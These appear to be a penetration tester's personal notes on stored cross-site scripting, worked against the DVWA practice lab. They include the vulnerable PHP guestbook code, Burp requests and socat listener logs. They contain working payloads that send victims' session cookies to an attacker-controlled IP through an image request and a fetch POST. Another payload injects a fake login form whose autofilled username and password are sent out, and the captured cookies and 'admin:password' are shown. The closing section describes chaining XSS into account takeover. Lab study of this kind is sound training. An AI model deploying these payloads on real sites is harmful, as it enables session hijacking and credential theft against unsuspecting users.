# notes:
- It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other
- Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers:
   1. Secure
   2. HttpOnly
- The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.
   This protects the cookie from being sent in cleartext and captured over the network.
- The HttpOnly flag instructs the browser to deny JavaScript access to the cookie.
   If this flag is not set,
      we can use an XSS payload to steal the cookie.
---

## impact
1. cookie theft

---

# common JS
## onload event
```html
<body onload='alert("Welcome to my website")'>
```
## on mouse over
```html
<a onmouseover='alert("50% discount")'>surprise</a>
```
## other event handlers
| Event Handler | Description |
| --- | --- |
| onclick | Use this to invoke JavaScript upon clicking (a link, or form boxes) |
| onload | Use this to invoke JavaScript after the page or an image has finished loading |
| onmouseover | Use this to invoke JavaScript if the mouse passes by some link |
| onmouseout | Use this to invoke JavaScript if the mouse goes past some link |
| onunload | Use this to invoke JavaScript right after someone leaves this page. |

---

# XSS: security: low
```php
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```
## sample request
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test2&mtxMessage=test2&btnSign=Sign+Guestbook
```
## XSS Request: payload (url-encoded) in the txtMessage parameter (the txtName parameter was also vulnerable)
```html
<script>new Image().src="http://20.20.20.129/cool.jpg?output="+document.cookie;</script>
```
## Note: the comment field had a character limit where we couldn't insert the entire payload. That's why we used `burp` for that
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test&mtxMessage=<script>new+Image().src%3d"http%3a//20.20.20.129/cool.jpg%3foutput%3d"%2bdocument.cookie%3b</script>&btnSign=Sign+Guestbook
```
## When the page is visited, we get back the cookies on our socat listener:
```bash
socat -d -d TCP4-LISTEN:80,reuseaddr,fork STDOUT
```
```
2022/07/27 14:08:53 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213159] N accepting connection from AF=2 20.20.20.129:50996 on AF=2 20.20.20.129:80
2022/07/27 14:09:00 socat[213159] N forked off child process 213203
2022/07/27 14:09:00 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213203] N using stdout for reading and writing
2022/07/27 14:09:00 socat[213203] N starting data transfer loop with FDs [6,6] and [1,1]
GET /cool.jpg?output=security=low;%20PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5 HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://meta/
```
## another payload to steal cookies (from portswigger labs) using POST
```html
<script>fetch('http://20.20.20.129', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```
### output: Much cleaner :D
```
2022/07/27 15:47:54 socat[249716] N listening on AF=2 0.0.0.0:80
2022/07/27 15:48:35 socat[249716] N accepting connection from AF=2 20.20.20.129:53706 on AF=2 20.20.20.129:80
2022/07/27 15:48:35 socat[249716] N forked off child process 249964
2022/07/27 15:48:35 socat[249716] N listening on AF=2 0.0.0.0:80
2022/07/27 15:48:35 socat[249964] N using stdout for reading and writing
2022/07/27 15:48:35 socat[249964] N starting data transfer loop with FDs [6,6] and [1,1]
POST / HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://meta/
Content-Type: text/plain;charset=UTF-8
Origin: http://meta
Content-Length: 56
Connection: close

security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
```

---

## XSS to steal username/password
### payload:
```html
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
```
anyone who views the comments will see a login form. if his browser autofills the username and password fields, they would be posted to the url included in the payload
### output:
```
2022/07/27 15:58:01 socat[253401] N listening on AF=2 0.0.0.0:80
2022/07/27 15:58:11 socat[253401] N accepting connection from AF=2 20.20.20.129:46510 on AF=2 20.20.20.129:80
2022/07/27 15:58:11 socat[253401] N forked off child process 253456
2022/07/27 15:58:11 socat[253401] N listening on AF=2 0.0.0.0:80
2022/07/27 15:58:11 socat[253456] N using stdout for reading and writing
2022/07/27 15:58:11 socat[253456] N starting data transfer loop with FDs [6,6] and [1,1]
POST / HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://meta/
Content-Type: text/plain;charset=UTF-8
Origin: http://meta
Content-Length: 14
Connection: close

admin:password
```

---

## Exploiting cross-site scripting to perform CSRF
- *Anything a legitimate user can do on a web site,*
   you can probably do too with XSS.
- *Depending on the site you're targeting,*
   you might be able to make a victim:
   - send a message,
   - accept a friend request,
   - commit a backdoor to a source code repository,
   - or transfer some Bitcoin.
- Some websites allow logged-in users to change their email address without re-entering their password.
   *If you've found an XSS vulnerability,*
      you can make it trigger this functionality to:
      change the victim's email address to one that you control,
      and then trigger a password reset to gain access to the account. 